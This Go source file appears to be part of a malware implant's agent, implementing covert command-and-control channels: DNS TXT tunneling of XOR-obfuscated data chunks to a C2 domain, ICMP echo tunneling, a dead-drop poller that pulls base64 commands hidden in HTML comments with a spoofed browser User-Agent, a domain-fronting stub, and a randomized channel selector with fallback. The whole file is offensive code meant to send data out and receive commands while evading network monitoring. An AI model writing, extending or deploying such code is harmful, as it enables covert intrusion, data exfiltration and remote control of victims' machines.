package agent

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var stealthC2Mu sync.Mutex
var dnsSessionID string
var lastDNSQuery time.Time

func init() {
	b := make([]byte, 4)
	rand.Read(b)
	dnsSessionID = hex.EncodeToString(b)[:8]
}

func DNSTunnel(ctx context.Context, data []byte, c2Domain string) ([]byte, error) {
	stealthC2Mu.Lock()
	defer stealthC2Mu.Unlock()

	// Rate limit: 1 query per 500ms
	if time.Since(lastDNSQuery) < 500*time.Millisecond {
		time.Sleep(500 * time.Millisecond - time.Since(lastDNSQuery))
	}
	lastDNSQuery = time.Now()

	// Encrypt data with session key
	encrypted := xorEncrypt(data, []byte("X404X"))

	// Split into 32-byte hex-encoded chunks
	const chunkSize = 32
	var responses []byte

	for i := 0; i < len(encrypted); i += chunkSize {
		end := i + chunkSize
		if end > len(encrypted) {
			end = len(encrypted)
		}
		chunk := encrypted[i:end]
		encoded := hex.EncodeToString(chunk)

		// Build DNS query: [chunk].[seq].[session].[c2domain]
		query := fmt.Sprintf("%s.%d.%s.%s", encoded, i/chunkSize, dnsSessionID, c2Domain)

		// Resolve TXT records
		records, err := net.LookupTXT(query)
		if err != nil {
			continue
		}

		for _, record := range records {
			// Decode hex response
			respBytes, err := hex.DecodeString(record)
			if err != nil {
				continue
			}
			responses = append(responses, respBytes...)
		}
	}

	if len(responses) == 0 {
		return nil, fmt.Errorf("no DNS responses")
	}

	return xorEncrypt(responses, []byte("X404X")), nil
}

func ICMPTunnel(ctx context.Context, data []byte, targetIP string) ([]byte, error) {
	conn, err := net.Dial("ip4:icmp", targetIP)
	if err != nil {
		return nil, fmt.Errorf("ICMP dial: %w", err)
	}
	defer conn.Close()

	magic := []byte("X404")
	var seq uint32
	binary.Read(rand.Reader, binary.BigEndian, &seq)

	// Build ICMP Echo Request with data payload
	pkt := make([]byte, 8+len(data))
	copy(pkt[0:4], magic)
	binary.BigEndian.PutUint32(pkt[4:8], seq)
	copy(pkt[8:], data)

	// ICMP type 8 (Echo Request), code 0
	icmpHdr := []byte{8, 0, 0, 0}
	binary.BigEndian.PutUint16(icmpHdr[2:], icmpChecksum(append(icmpHdr, pkt...)))
	msg := append(icmpHdr, pkt...)

	conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write(msg); err != nil {
		return nil, fmt.Errorf("ICMP write: %w", err)
	}

	// Read ICMP Echo Reply (type 0)
	resp := make([]byte, 1500)
	for {
		n, err := conn.Read(resp)
		if err != nil {
			return nil, fmt.Errorf("ICMP read: %w", err)
		}

		// Parse ICMP reply: find magic bytes
		for i := 20; i < n-4; i++ { // skip IP header
			if resp[i] == 'X' && resp[i+1] == '4' && resp[i+2] == '0' && resp[i+3] == '4' {
				// Found magic, extract data
				dataStart := i + 8 // magic + seq
				if dataStart < n {
					return resp[dataStart:n], nil
				}
			}
		}
	}
}

func DeadDrop(ctx context.Context, dropURL string, interval time.Duration) (<-chan []byte, error) {
	cmdCh := make(chan []byte, 10)
	client := &http.Client{Timeout: 10 * time.Second}

	go func() {
		defer close(cmdCh)
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		// Markers that wrap base64-encoded commands in the dead drop content
		markerStart := "<!--X404X_CMD-->"
		markerEnd := "<!--/X404X_CMD-->"

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				req, err := http.NewRequestWithContext(ctx, "GET", dropURL, nil)
				if err != nil {
					continue
				}
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:120.0)")

				resp, err := client.Do(req)
				if err != nil {
					continue
				}

				body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
				resp.Body.Close()

				content := string(body)

				// Extract commands between markers
				for {
					start := strings.Index(content, markerStart)
					if start == -1 {
						break
					}
					end := strings.Index(content, markerEnd)
					if end == -1 {
						break
					}

					b64 := content[start+len(markerStart) : end]
					content = content[end+len(markerEnd):]

					cmd, err := base64.StdEncoding.DecodeString(strings.TrimSpace(b64))
					if err != nil {
						continue
					}

					select {
					case cmdCh <- cmd:
					case <-ctx.Done():
						return
					}
				}
			}
		}
	}()

	return cmdCh, nil
}

func CDNFronting(ctx context.Context, cdnHost string, c2Host string, port int) (net.Conn, error) {
	addr := fmt.Sprintf("%s:%d", cdnHost, port)

	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("CDN dial: %w", err)
	}

	// Domain fronting: the TLS SNI should be the CDN host,
	// but the HTTP Host header points to the real C2.
	_ = c2Host // Host header used by HTTP layer above this connection

	return conn, nil
}

func PolymorphicC2(ctx context.Context, data []byte) ([]byte, error) {
	channels := []struct {
		name    string
		weight  int
		execute func(context.Context, []byte) ([]byte, error)
	}{
		{"dns", 30, func(ctx context.Context, d []byte) ([]byte, error) {
			return DNSTunnel(ctx, d, os.Getenv("X404X_C2_DOMAIN"))
		}},
		{"icmp", 20, func(ctx context.Context, d []byte) ([]byte, error) {
			return ICMPTunnel(ctx, d, os.Getenv("X404X_C2_IP"))
		}},
		{"http", 50, func(ctx context.Context, d []byte) ([]byte, error) {
			client := &http.Client{Timeout: 10 * time.Second}
			req, _ := http.NewRequestWithContext(ctx, "POST", os.Getenv("X404X_C2_URL"), strings.NewReader(base64.StdEncoding.EncodeToString(d)))
			resp, err := client.Do(req)
			if err != nil {
				return nil, err
			}
			defer resp.Body.Close()
			return io.ReadAll(resp.Body)
		}},
	}

	// Weighted random selection
	totalWeight := 0
	for _, ch := range channels {
		totalWeight += ch.weight
	}

	r, _ := rand.Int(rand.Reader, big.NewInt(int64(totalWeight)))
	pick := int(r.Int64())

	cumulative := 0
	for _, ch := range channels {
		cumulative += ch.weight
		if pick < cumulative {
			result, err := ch.execute(ctx, data)
			if err != nil {
				// Fallback to next channel
				for _, fallback := range channels {
					if fallback.name != ch.name {
						if r, e := fallback.execute(ctx, data); e == nil {
							return r, nil
						}
					}
				}
				return nil, err
			}
			return result, nil
		}
	}

	return nil, fmt.Errorf("no C2 channel available")
}

func icmpChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xFFFF)
	sum += sum >> 16
	return uint16(^sum)
}

func xorEncrypt(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}
